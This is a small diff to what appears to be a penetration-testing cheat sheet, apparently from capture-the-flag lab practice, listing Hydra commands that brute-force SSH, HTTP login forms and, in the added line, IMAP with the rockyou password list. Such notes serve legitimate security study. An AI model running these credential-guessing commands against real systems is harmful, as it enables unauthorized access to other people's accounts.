@@ -52,6 +52,7 @@ hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 
 sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
 sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
 sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
+hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
 ````
 
 
